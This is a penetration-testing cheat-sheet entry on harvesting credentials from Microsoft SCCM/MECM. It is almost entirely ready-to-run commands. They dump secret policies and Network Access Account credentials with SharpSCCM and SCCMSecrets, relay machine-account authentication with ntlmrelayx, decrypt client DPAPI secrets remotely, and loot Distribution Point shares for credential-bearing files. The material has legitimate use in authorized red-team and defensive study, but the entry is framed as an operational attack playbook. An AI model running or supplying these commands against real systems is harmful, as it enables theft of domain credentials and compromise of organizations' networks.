---
technique: SCCMCredentialHarvesting
category: sccm-mecm
targets: Management Point, Distribution Point, SCCM Clients
protocols: HTTP, HTTPS, SMB, WMI, DPAPI
remote_capable: true
tags: sccm mecm credential-harvesting naa task-sequence distribution-point dpapi ad
---

# SCCMCredentialHarvesting

SCCM can expose credentials through secret policies, Network Access Accounts, task sequences, collection variables, client DPAPI blobs, and Distribution Point content. Approved SCCM devices or relayed machine accounts can request secret policies, while any domain account often has enough access to loot Distribution Point resources.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Approved device | Secret policy dumping needs an approved SCCM client identity |
| Machine account | Domain computer credentials can register an approved device in default configurations |
| DP access | Distribution Point resources often require any valid domain account |

## Windows

### SharpSCCM register and dump secrets

#powershell #sharpsccm #policies

Register a device with machine account credentials and dump assigned SCCM secret policies.

```powershell title:"Register SCCM device and dump secret policies"
.\SharpSCCM.exe get secrets -r "$client_name" -u "$machine_account" -p "$machine_password"
```
<!-- cheat
var client_name
var machine_account
var machine_password
-->

### SharpSCCM local disk secrets

#powershell #sharpsccm #dpapi

Dump SCCM policy secrets cached on disk from a compromised SCCM client.

```powershell title:"Dump local SCCM disk secrets with SharpSCCM"
.\SharpSCCM.exe local secrets disk
```
<!-- cheat -->

### SharpSCCM local WMI secrets

#powershell #sharpsccm #wmi

Dump SCCM policy secrets from WMI on a compromised SCCM client.

```powershell title:"Dump local SCCM WMI secrets with SharpSCCM"
.\SharpSCCM.exe local secrets wmi
```
<!-- cheat -->

### SharpDPAPI SCCM

#powershell #sharpdpapi #dpapi

Decrypt SCCM client policy secrets using SharpDPAPI.

```powershell title:"Decrypt SCCM policy secrets with SharpDPAPI"
.\SharpDPAPI.exe SCCM
```
<!-- cheat -->

### PowerShell NAA policy

#powershell #native #wmi

Read cached Network Access Account policy objects from a local SCCM client.

```powershell title:"Read SCCM Network Access Account policy via WMI"
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
```
<!-- cheat -->

### PowerShell task sequence policy

#powershell #native #wmi

Read cached task sequence policy objects from a local SCCM client.

```powershell title:"Read SCCM task sequence policy via WMI"
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
```
<!-- cheat -->

### CMLoot inventory

#powershell #cmloot #distribution-point

Index available files in an SCCM content library share.

```powershell title:"Inventory SCCM content library with CMLoot"
Invoke-CMLootInventory -SCCMHost "$sccm_host" -Outfile sccmfiles.txt
```
<!-- cheat
var sccm_host
-->

### CMLoot download extension

#powershell #cmloot #distribution-point

Download SCCM content library files matching a chosen extension.

```powershell title:"Download SCCM content files by extension with CMLoot"
Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension $extension
```
<!-- cheat
var extension
-->

## Linux

### SCCMSecrets HTTP policies

#python #sccmsecrets #policies

Register an SCCM device over HTTP and dump secret policies with machine account credentials.

```sh title:"Dump SCCM secret policies over HTTP"
python3 SCCMSecrets.py policies -mp "http://$mp_ip" -u "$machine_account" -p "$machine_password" -cn "$client_name"
```
<!-- cheat
var mp_ip
var machine_account
var machine_password
var client_name
-->

### SCCMSecrets HTTPS policies

#python #sccmsecrets #policies #certificate

Dump SCCM secret policies over HTTPS using client certificate authentication.

```sh title:"Dump SCCM secret policies over HTTPS with client cert"
python3 SCCMSecrets.py policies -mp "https://$mp_ip" -u "$machine_account" -p "$machine_password" -cn "$client_name" --pki-cert "$cert_pem" --pki-key "$key_pem"
```
<!-- cheat
var mp_ip
var machine_account
var machine_password
var client_name
var cert_pem
var key_pem
-->

### ntlmrelayx SCCM policies

#python #impacket #relay #policies

Relay machine account authentication to the SCCM Windows-auth registration endpoint and dump policies.

```sh title:"Relay machine auth to SCCM policy endpoint"
ntlmrelayx.py -t "http://$mp_fqdn/ccm_system_windowsauth/request" -smb2support --sccm-policies -debug
```
<!-- cheat
var mp_fqdn
-->

### SCCMSecrets existing device

#python #sccmsecrets #policies

Use a compromised SCCM device identity to dump policies for its assigned collections.

```sh title:"Dump SCCM policies with existing device identity"
python3 SCCMSecrets.py policies -mp "http://$mp_ip" --use-existing-device "$device_dir"
```
<!-- cheat
var mp_ip
var device_dir
-->

### SystemDPAPIdump SCCM

#python #impacket #dpapi

Decrypt local SCCM client policy secrets remotely with local administrator credentials.

```sh title:"Dump SCCM DPAPI secrets with SystemDPAPIdump"
SystemDPAPIdump.py -creds -sccm "$domain/$user:$pass@$target"
```
<!-- cheat
import domain_ip
import users
import passwords
var target
-->

### sccmhunter DPAPI

#python #sccmhunter #dpapi

Dump SCCM client DPAPI secrets through WMI using sccmhunter.

```sh title:"Dump SCCM DPAPI secrets with sccmhunter"
python3 sccmhunter.py dpapi -u "$user" -p "$pass" -d "$domain" -dc-ip "$rhost_ip" -target "$target" -wmi
```
<!-- cheat
import domain_ip
import users
import passwords
var target
-->

### SCCMSecrets anonymous DP files

#python #sccmsecrets #distribution-point

Index and download files from a Distribution Point that allows anonymous HTTP access.

```sh title:"Download anonymous SCCM Distribution Point files"
python3 SCCMSecrets.py files -dp "http://$dp_ip"
```
<!-- cheat
var dp_ip
-->

### SCCMSecrets DP extensions

#python #sccmsecrets #distribution-point

Download Distribution Point files with credential-oriented extensions.

```sh title:"Download SCCM Distribution Point files by extension"
python3 SCCMSecrets.py files -dp "http://$dp_ip" -u "$user" -H "$nt_hash" --extensions ".txt,.xml,.ps1,.pfx,.ini,.conf"
```
<!-- cheat
import users
var dp_ip
var nt_hash
-->

### sccm-http-looter

#go #distribution-point #anonymous

Loot an anonymously accessible SCCM HTTP Distribution Point.

```sh title:"Loot anonymous SCCM HTTP Distribution Point"
./sccm-http-looter -server "$dp_ip"
```
<!-- cheat
var dp_ip
-->

### cmloot download

#python #cmloot #smb

Enumerate SCCM servers, build a content inventory, and download selected files over SMB.

```sh title:"Download SCCM content library files with cmloot"
python3 cmloot.py "$domain/$user@$target" -findsccmservers -target-file sccmhosts.txt -cmlootdownload sccmfiles.txt
```
<!-- cheat
import domain_ip
import users
var target
-->
